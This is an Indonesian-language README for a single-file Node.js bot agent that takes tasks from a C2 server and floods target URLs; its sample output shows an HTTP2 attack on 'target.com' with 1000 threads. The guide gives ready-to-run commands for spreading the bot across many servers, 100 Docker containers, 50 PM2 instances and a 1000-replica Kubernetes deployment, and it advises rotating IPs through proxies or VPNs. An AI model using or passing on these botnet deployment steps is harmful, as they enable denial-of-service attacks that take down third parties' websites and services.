# 🤖 Simple Bot Agent - Single File Edition

Bot agent standalone dalam **SATU FILE** aja! Gampang deploy ke mana-mana.

## 🚀 Cara Pakai (Super Simple!)

### 1. Copy File
```bash
# Copy simple-bot.js ke server/VPS manapun
scp simple-bot.js user@server:/path/to/bot/
```

### 2. Install Dependencies (Cuma 2!)
```bash
npm install axios socket.io-client
```

### 3. Jalankan Bot
```bash
# Ganti dengan URL C2 server lu
node simple-bot.js https://your-c2-server.com

# Atau local
node simple-bot.js http://localhost:8080
```

**DONE!** Bot langsung connect ke C2 server! 🎉

## 📦 Deploy ke Banyak Server

### Method 1: Manual Copy
```bash
# Copy ke 10 server sekaligus
for server in server1 server2 server3 server4 server5; do
    scp simple-bot.js user@$server:/home/user/
    ssh user@$server "cd /home/user && npm install axios socket.io-client && nohup node simple-bot.js https://your-c2.com &"
done
```

### Method 2: Docker (Recommended!)
```bash
# Buat Dockerfile
cat > Dockerfile << 'EOF'
FROM node:18-alpine
WORKDIR /app
COPY simple-bot.js package.json ./
RUN npm install axios socket.io-client
CMD ["node", "simple-bot.js", "https://your-c2.com"]
EOF

# Build & Run
docker build -t simple-bot .
docker run -d simple-bot

# Deploy ke 100 container!
for i in {1..100}; do
    docker run -d --name bot-$i simple-bot
done
```

### Method 3: PM2 (Keep Alive)
```bash
# Install PM2
npm install -g pm2

# Start bot dengan PM2
pm2 start simple-bot.js --name "bot-1" -- https://your-c2.com

# Start 50 bots sekaligus!
for i in {1..50}; do
    pm2 start simple-bot.js --name "bot-$i" -- https://your-c2.com
done

# Monitor semua bots
pm2 monit
```

## 🎯 Keuntungan Simple Bot

✅ **Satu file aja** - Gampang deploy  
✅ **Minimal dependencies** - Cuma axios & socket.io-client  
✅ **Auto-reconnect** - Kalau disconnect, auto connect lagi  
✅ **Heartbeat system** - C2 tahu bot masih hidup  
✅ **Multi-attack support** - Bisa handle banyak attack sekaligus  
✅ **Colored logs** - Gampang monitor  
✅ **Graceful shutdown** - Ctrl+C bersih  

## 📊 Output Example

```
╔═══════════════════════════════════════════════════════════╗
║           🤖 SIMPLE BOT AGENT - Single File 🤖           ║
╚═══════════════════════════════════════════════════════════╝

[10:30:15] Bot ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
[10:30:15] C2 URL: https://your-c2.com

[10:30:16] ✅ Bot registered: a1b2c3d4-e5f6-7890-abcd-ef1234567890
[10:30:16]    Hostname: server-01
[10:30:16]    IP: 1.2.3.4
[10:30:16] 🔌 Connecting to C2: https://your-c2.com
[10:30:17] ✅ WebSocket connected
[10:30:17] ✅ Authenticated with C2 server
[10:30:45] 📥 New task received: task-123
[10:30:45] ⚡ Starting attack: HTTP2 -> https://target.com
[10:30:45]    Threads: 1000, Duration: 60s, RPC: 10
```

## 🔧 Troubleshooting

### Bot tidak connect?
```bash
# Check C2 server running
curl https://your-c2.com/api/health

# Check network
ping your-c2.com
```

### Dependencies error?
```bash
# Install ulang
rm -rf node_modules
npm install axios socket.io-client
```

### Bot crash?
```bash
# Pakai PM2 untuk auto-restart
pm2 start simple-bot.js --name bot-1 -- https://your-c2.com
pm2 save
pm2 startup
```

## 🚀 Scale to 1000+ Bots

### Cloud Deploy (AWS/GCP/Azure)
```bash
# Buat script deploy.sh
#!/bin/bash
for i in {1..1000}; do
    # Spin up VM
    # Install Node.js
    # Copy simple-bot.js
    # Run bot
done
```

### Kubernetes (Advanced)
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: simple-bot
spec:
  replicas: 1000  # 1000 bots!
  template:
    spec:
      containers:
      - name: bot
        image: simple-bot:latest
        env:
        - name: C2_URL
          value: "https://your-c2.com"
```

## 💡 Tips

1. **Distributed deployment** - Deploy ke banyak region/provider
2. **Rotate IPs** - Pakai proxy atau VPN
3. **Monitor health** - Check C2 dashboard
4. **Auto-restart** - Pakai PM2 atau systemd
5. **Resource limits** - Set CPU/memory limits per bot

## 📝 Notes

- Bot ini spawn attack process dari main bot (`index.js`)
- Pastikan `index.js` ada di folder yang sama
- Atau modify `executeAttack()` untuk direct attack implementation

---

**Developer:** Aryzz-Dev (@AryzXploit)  
**Version:** 1.0.0 - Single File Edition
